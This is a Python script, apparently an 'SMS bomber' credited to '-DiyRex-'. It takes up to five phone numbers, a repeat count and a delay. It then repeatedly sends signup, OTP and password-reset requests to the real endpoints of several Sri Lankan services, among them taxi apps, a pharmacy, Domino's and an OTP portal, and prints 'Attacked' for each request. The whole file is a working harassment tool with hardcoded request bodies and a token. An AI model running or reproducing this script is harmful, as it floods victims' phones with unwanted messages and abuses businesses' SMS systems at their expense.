
import urllib
from urllib import request
import time
from requests import post, get

name = """  

      _      _     _   _____  _  ____  ____  ____  _     
     / \__/|/ \ /\/ \ /__ __\/ \/ ___\/  __\/  _ \/ \__/|
     | |\/||| | ||| |   / \  | ||    \|  \/|| / \|| |\/||
     | |  ||| \_/|| |_/\| |  | |\___ ||  __/| |-||| |  ||
     \_/  \|\____/\____/\_/  \_/\____/\_/   \_/ \|\_/  \|
                                                    

                           Script By -DiyRex- :)
"""

print(name, "\n")

num  = input(">>Enter Mobile number 1 with 0: ")
time.sleep(0.2)
num1 = input(">>Enter Mobile number 2 with 0: ")
time.sleep(0.2)
num2 = input(">>Enter Mobile number 3 with 0: ")
time.sleep(0.2)
num3 = input(">>Enter Mobile number 4 with 0: ")
time.sleep(0.2)
num4 = input(">>Enter Mobile number 5 with 0: ")
time.sleep(0.2)
F = int(input(">>count: "))
T = int(input(">>Delay: "))


def spm():
    url = 'https://guru.lk/auth/headstart/ajax.php'
    body = {'phone': num, 'course': '1', 'sesskey': '', 'action': 'sms_reg'}
    time.sleep(T)
    poreq = post(url, data=body)
    print(" Attacked " + num + " By Guru !!")
    url = 'http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
    body = {'countrycode': '94', 'mobile': num, 'name': 'santha', 'email': ''}
    time.sleep(T)
    poreq = post(url, data=body)
    print(" Attacked " + num + " By Yogo !!")

    url1 = 'https://guru.lk/auth/headstart/ajax.php'
    body1 = {'phone': num1, 'course': '1', 'sesskey': '', 'action': 'sms_reg'}
    time.sleep(T)
    poreq = post(url, data=body1)
    print(" Attacked " + num1 + " By Guru !!")
    url = 'http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
    body = {'countrycode': '94', 'mobile': num1, 'name': 'santha', 'email': ''}
    time.sleep(T)
    poreq = post(url, data=body)
    print(" Attacked " + num1 + " By Yogo !!")

    url2 = 'https://guru.lk/auth/headstart/ajax.php'
    body2 = {'phone': num2, 'course': '1', 'sesskey': '', 'action': 'sms_reg'}
    time.sleep(T)
    poreq = post(url, data=body2)
    print(" Attacked " + num2 + " By Guru !!")
    url = 'http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
    body = {'countrycode': '94', 'mobile': num2, 'name': 'santha', 'email': ''}
    time.sleep(T)
    poreq = post(url, data=body)
    print(" Attacked " + num2 + " By Yogo !!")

    url3 = 'https://guru.lk/auth/headstart/ajax.php'
    body3 = {'phone': num3, 'course': '1', 'sesskey': '', 'action': 'sms_reg'}
    time.sleep(T)
    poreq = post(url, data=body3)
    print(" Attacked " + num3 + " By Guru !!")
    url = 'http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
    body = {'countrycode': '94', 'mobile': num3, 'name': 'santha', 'email': ''}
    time.sleep(T)
    poreq = post(url, data=body)
    print(" Attacked " + num3 + " By Yogo !!")

    url4 = 'https://guru.lk/auth/headstart/ajax.php'
    body4 = {'phone': num4, 'course': '1', 'sesskey': '', 'action': 'sms_reg'}
    time.sleep(T)
    poreq = post(url, data=body4)
    print(" Attacked " + num4 + " By Guru !!")
    url = 'http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
    body = {'countrycode': '94', 'mobile': num4, 'name': 'santha', 'email': ''}
    time.sleep(T)
    poreq = post(url, data=body)
    print(" Attacked " + num4 + " By Yogo !!")


def spm2():
    url = 'https://mobile.doc.lk/user-register/send-sms'
    head = {'Host': 'mobile.doc.lk', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
    body = {'formId': '469738', 'country': '1', 'phone': num, 'email': '',
            '_token': 'JnkhHDk6zEg3jtnWhz1rI0z2ETGtcsXW4TdtoiVy'}
    time.sleep(T)
    req = post(url, headers=head, data=body)
    print(" Attacked " + num + " By Doc99 !!")

    url = 'https://mobile.doc.lk/user-register/send-sms'
    head = {'Host': 'mobile.doc.lk', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
    body = {'formId': '469738', 'country': '1', 'phone': num1, 'email': '',
            '_token': 'JnkhHDk6zEg3jtnWhz1rI0z2ETGtcsXW4TdtoiVy'}
    time.sleep(T)
    req = post(url, headers=head, data=body)
    print(" Attacked " + num1 + " By Doc99 !!")

    url = 'https://mobile.doc.lk/user-register/send-sms'
    head = {'Host': 'mobile.doc.lk', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
    body = {'formId': '469738', 'country': '1', 'phone': num2, 'email': '',
            '_token': 'JnkhHDk6zEg3jtnWhz1rI0z2ETGtcsXW4TdtoiVy'}
    time.sleep(T)
    req = post(url, headers=head, data=body)
    print(" Attacked " + num2 + " By Doc99 !!")

    url = 'https://mobile.doc.lk/user-register/send-sms'
    head = {'Host': 'mobile.doc.lk', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
    body = {'formId': '469738', 'country': '1', 'phone': num3, 'email': '',
            '_token': 'JnkhHDk6zEg3jtnWhz1rI0z2ETGtcsXW4TdtoiVy'}
    time.sleep(T)
    req = post(url, headers=head, data=body)
    print(" Attacked " + num3 + " By Doc99 !!")

    url = 'https://mobile.doc.lk/user-register/send-sms'
    head = {'Host': 'mobile.doc.lk', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
    body = {'formId': '469738', 'country': '1', 'phone': num4, 'email': '',
            '_token': 'JnkhHDk6zEg3jtnWhz1rI0z2ETGtcsXW4TdtoiVy'}
    time.sleep(T)
    req = post(url, headers=head, data=body)
    print(" Attacked " + num4 + " By Doc99 !!")


def md1():
    url = 'https://www.patpat.lk/api/customer.php'
    para = {'customer': 'new_customer'}
    head = {'Host': 'www.patpat.lk'}
    body = {'title': 'Mr.', 'first_name': 'How Do you feel', 'last_name': 'Stay calm!!!', 'email': 's1@l.lk',
            'password': 'MTIzNDU2Nw==', 'telephone': num, 'gender': '', 'dob': '1976-08-24'}
    time.sleep(T)
    po = post(url, params=para, headers=head, json=body)
    print(" Attacked " + num + " By Patpat !!")

    url = 'https://www.patpat.lk/api/customer.php'
    para = {'customer': 'new_customer'}
    head = {'Host': 'www.patpat.lk'}
    body = {'title': 'Mr.', 'first_name': 'How Do you feel', 'last_name': 'Stay calm!!!', 'email': 's1@l.lk',
            'password': 'MTIzNDU2Nw==', 'telephone': num1, 'gender': '', 'dob': '1976-08-24'}
    time.sleep(T)
    po = post(url, params=para, headers=head, json=body)
    print(" Attacked " + num1 + " By Patpat !!")

    url = 'https://www.patpat.lk/api/customer.php'
    para = {'customer': 'new_customer'}
    head = {'Host': 'www.patpat.lk'}
    body = {'title': 'Mr.', 'first_name': 'How Do you feel', 'last_name': 'Stay calm!!!', 'email': 's1@l.lk',
            'password': 'MTIzNDU2Nw==', 'telephone': num2, 'gender': '', 'dob': '1976-08-24'}
    time.sleep(T)
    po = post(url, params=para, headers=head, json=body)
    print(" Attacked " + num2 + " By Patpat !!")

    url = 'https://www.patpat.lk/api/customer.php'
    para = {'customer': 'new_customer'}
    head = {'Host': 'www.patpat.lk'}
    body = {'title': 'Mr.', 'first_name': 'How Do you feel', 'last_name': 'Stay calm!!!', 'email': 's1@l.lk',
            'password': 'MTIzNDU2Nw==', 'telephone': num3, 'gender': '', 'dob': '1976-08-24'}
    time.sleep(T)
    po = post(url, params=para, headers=head, json=body)
    print(" Attacked " + num3 + " By Patpat !!")

    url = 'https://www.patpat.lk/api/customer.php'
    para = {'customer': 'new_customer'}
    head = {'Host': 'www.patpat.lk'}
    body = {'title': 'Mr.', 'first_name': 'How Do you feel', 'last_name': 'Stay calm!!!', 'email': 's1@l.lk',
            'password': 'MTIzNDU2Nw==', 'telephone': num4, 'gender': '', 'dob': '1976-08-24'}
    time.sleep(T)
    po = post(url, params=para, headers=head, json=body)
    print(" Attacked " + num4 + " By Patpat !!")


def md2():
    url = 'https://portal.ideabiz.lk/v2/user/otpRequest'
    head = {'Host': 'portal.ideabiz.lk'}
    body = {"method": "ANC", "msisdn": "94" + num[1:]}
    time.sleep(T)
    po = post(url, headers=head, json=body)
    print(" Attacked " + num + " By IdeaBiz !!")

    url = 'https://portal.ideabiz.lk/v2/user/otpRequest'
    head = {'Host': 'portal.ideabiz.lk'}
    body = {"method": "ANC", "msisdn": "94" + num1[1:]}
    time.sleep(T)
    po = post(url, headers=head, json=body)
    print(" Attacked " + num1 + " By IdeaBiz !!")

    url = 'https://portal.ideabiz.lk/v2/user/otpRequest'
    head = {'Host': 'portal.ideabiz.lk'}
    body = {"method": "ANC", "msisdn": "94" + num2[1:]}
    time.sleep(T)
    po = post(url, headers=head, json=body)
    print(" Attacked " + num2 + " By IdeaBiz !!")

    url = 'https://portal.ideabiz.lk/v2/user/otpRequest'
    head = {'Host': 'portal.ideabiz.lk'}
    body = {"method": "ANC", "msisdn": "94" + num3[1:]}
    time.sleep(T)
    po = post(url, headers=head, json=body)
    print(" Attacked " + num3 + " By IdeaBiz !!")

    url = 'https://portal.ideabiz.lk/v2/user/otpRequest'
    head = {'Host': 'portal.ideabiz.lk'}
    body = {"method": "ANC", "msisdn": "94" + num4[1:]}
    time.sleep(T)
    po = post(url, headers=head, json=body)
    print(" Attacked " + num4 + " By IdeaBiz !!")

def md4():
    url = 'https://api.savarisrilanka.com/api/tenantIdNextTransportSLProd00001/users/signup-otp/request'
    body = {'email': 'a1@slt.net', 'numCountryCode': '+94', 'phoneNum': num[1:], 'referralCode': '',
            'userType': 'passenger'}
    time.sleep(T)
    po = post(url, json=body)
    print(" Attacked " + num + " By Savari !!")

    url = 'https://api.savarisrilanka.com/api/tenantIdNextTransportSLProd00001/users/signup-otp/request'
    body = {'email': 'a1@slt.net', 'numCountryCode': '+94', 'phoneNum': num1[1:], 'referralCode': '',
            'userType': 'passenger'}
    time.sleep(T)
    po = post(url, json=body)
    print(" Attacked " + num1 + " By Savari !!")

    url = 'https://api.savarisrilanka.com/api/tenantIdNextTransportSLProd00001/users/signup-otp/request'
    body = {'email': 'a1@slt.net', 'numCountryCode': '+94', 'phoneNum': num2[1:], 'referralCode': '',
            'userType': 'passenger'}
    time.sleep(T)
    po = post(url, json=body)
    print(" Attacked " + num2 + " By Savari !!")

    url = 'https://api.savarisrilanka.com/api/tenantIdNextTransportSLProd00001/users/signup-otp/request'
    body = {'email': 'a1@slt.net', 'numCountryCode': '+94', 'phoneNum': num3[1:], 'referralCode': '',
            'userType': 'passenger'}
    time.sleep(T)
    po = post(url, json=body)
    print(" Attacked " + num3 + " By Savari !!")

    url = 'https://api.savarisrilanka.com/api/tenantIdNextTransportSLProd00001/users/signup-otp/request'
    body = {'email': 'a1@slt.net', 'numCountryCode': '+94', 'phoneNum': num4[1:], 'referralCode': '',
            'userType': 'passenger'}
    time.sleep(T)
    po = post(url, json=body)
    print(" Attacked " + num4 + " By Savari !!")


def md5():
    url = 'http://youcab-apps.com/vconnect/passenger/v1/clientPinRequestData_droid.php'
    body = {'countrycode': '%2B94', 'mobile': num, 'name': 's', 'email': ''}
    time.sleep(T)
    po = post(url, data=body)
    print(" Attacked " + num + " By Youcab !!")

    url = 'http://youcab-apps.com/vconnect/passenger/v1/clientPinRequestData_droid.php'
    body = {'countrycode': '%2B94', 'mobile': num1, 'name': 's', 'email': ''}
    time.sleep(T)
    po = post(url, data=body)
    print(" Attacked " + num1 + " By Youcab !!")

    url = 'http://youcab-apps.com/vconnect/passenger/v1/clientPinRequestData_droid.php'
    body = {'countrycode': '%2B94', 'mobile': num2, 'name': 's', 'email': ''}
    time.sleep(T)
    po = post(url, data=body)
    print(" Attacked " + num2 + " By Youcab !!")

    url = 'http://youcab-apps.com/vconnect/passenger/v1/clientPinRequestData_droid.php'
    body = {'countrycode': '%2B94', 'mobile': num3, 'name': 's', 'email': ''}
    time.sleep(T)
    po = post(url, data=body)
    print(" Attacked " + num3 + " By Youcab !!")

    url = 'http://youcab-apps.com/vconnect/passenger/v1/clientPinRequestData_droid.php'
    body = {'countrycode': '%2B94', 'mobile': num4, 'name': 's', 'email': ''}
    time.sleep(T)
    po = post(url, data=body)
    print(" Attacked " + num4 + " By Youcab !!")


def md6():
    url = 'https://apis.dominoslk.com/loginhandler/forgotpassword'
    headers = {'Host': 'apis.dominoslk.com'}
    data = {'lastName': '', 'mobile': num[1:], 'firstName': ''}
    time.sleep(T)
    po = post(url, headers=headers, json=data)
    print(" Attacked " + num + " By Dominos !!")

    url = 'https://apis.dominoslk.com/loginhandler/forgotpassword'
    headers = {'Host': 'apis.dominoslk.com'}
    data = {'lastName': '', 'mobile': num1[1:], 'firstName': ''}
    time.sleep(T)
    po = post(url, headers=headers, json=data)
    print(" Attacked " + num1 + " By Dominos !!")

    url = 'https://apis.dominoslk.com/loginhandler/forgotpassword'
    headers = {'Host': 'apis.dominoslk.com'}
    data = {'lastName': '', 'mobile': num2[1:], 'firstName': ''}
    time.sleep(T)
    po = post(url, headers=headers, json=data)
    print(" Attacked " + num2 + " By Dominos !!")

    url = 'https://apis.dominoslk.com/loginhandler/forgotpassword'
    headers = {'Host': 'apis.dominoslk.com'}
    data = {'lastName': '', 'mobile': num3[1:], 'firstName': ''}
    time.sleep(T)
    po = post(url, headers=headers, json=data)
    print(" Attacked " + num3 + " By Dominos !!")

    url = 'https://apis.dominoslk.com/loginhandler/forgotpassword'
    headers = {'Host': 'apis.dominoslk.com'}
    data = {'lastName': '', 'mobile': num4[1:], 'firstName': ''}
    time.sleep(T)
    po = post(url, headers=headers, json=data)
    print(" Attacked " + num4 + " By Dominos !!")


for i in range(F):
    spm()
    spm2()
    md1()
    md2()
    md4()
    md5()
    md6()
